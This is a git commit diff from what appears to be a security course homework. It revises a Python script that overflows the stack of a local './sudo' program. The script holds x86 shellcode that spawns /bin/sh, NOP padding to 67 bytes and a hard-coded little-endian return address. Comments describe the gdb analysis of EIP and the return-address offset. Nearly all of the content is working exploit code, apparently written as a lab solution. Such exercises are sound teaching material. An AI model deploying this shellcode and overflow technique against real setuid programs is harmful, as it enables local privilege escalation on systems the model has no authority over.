1d86b79883a05f0d8b6f6cce6588e17cab60dd36
Kleinfeld, Ofri(okleinfeld) <okleinfeld@paypal.com>
2018-03-30 09:33:38 +0300

    adds docmunentation for q2b, fixed instruction file and fixed q1 file using also subprocess.call instead of os.system

--- hw4/q2/q2b.py
+++ hw4/q2/q2b.py
@@ -4,20 +4,22 @@ PATH_TO_SUDO = './sudo'
 
 
 def run_shell():
+	# the shell code itself - doesn't contain 0x00
+	assembler_password = '\xeb\x161\xc01\xc91\xd2[1\xff\x89\xdf\x83\xc7\x07\x89\x0f1\xc0\xb0\x0b\xcd\x80\xe8\xe5\xff\xff\xff/bin/sh@'
 	cmd = "pwd"# arbitrary, just used to follow the proper usage of the program
-	assembler_password = "1\xc01\xc91\xd2Ph//shh/bin\x89\xe31\xc0\xb0\x0b\xcd\x80" # the shell code itself - doesn't contain 0x00, 25 bytes long
-	nop = '\x90' * 42 # add NOPs complete to exactly 67 bytes long password
+	nop = '\x90' * (67 - len(assembler_password)) # add NOPs complete to exactly 67 bytes long password
 	shell_code_address = '\x69\xe0\xff\xbf' # Add begining of shell code address on stack, notic little endian
 	password = assembler_password + nop + shell_code_address
 	'''
 	using core analysis with gdb:
-	segmentation fault occured at address 0x0804007a, which is exactly the value of IEP register
+	segmentation fault occurred at address 0x0804007a, which is exactly the value of EIP register
 	analyzing further we see that the address (on stack) that contains this value is 0xbfffe0ac
 	so this is where RET value is stored on stack.
 	next, we see that our shell code (AAAAAAA...) starts exactly on address 0xbfffe069.
 	so this is where we would like to jump.
 	calculating, (altough already done in section a) the difference between the addresses is 67 bytes.
-	our shell code is only 25 bytes so we need more 42 NOP bytes.
+	so our shell code has to be 67 bytes, then add the address in little endian.
+	so we will add NOPs to complete to exactly 67 bytes.
 	'''
 	subprocess.call([PATH_TO_SUDO, password, cmd])
 	return
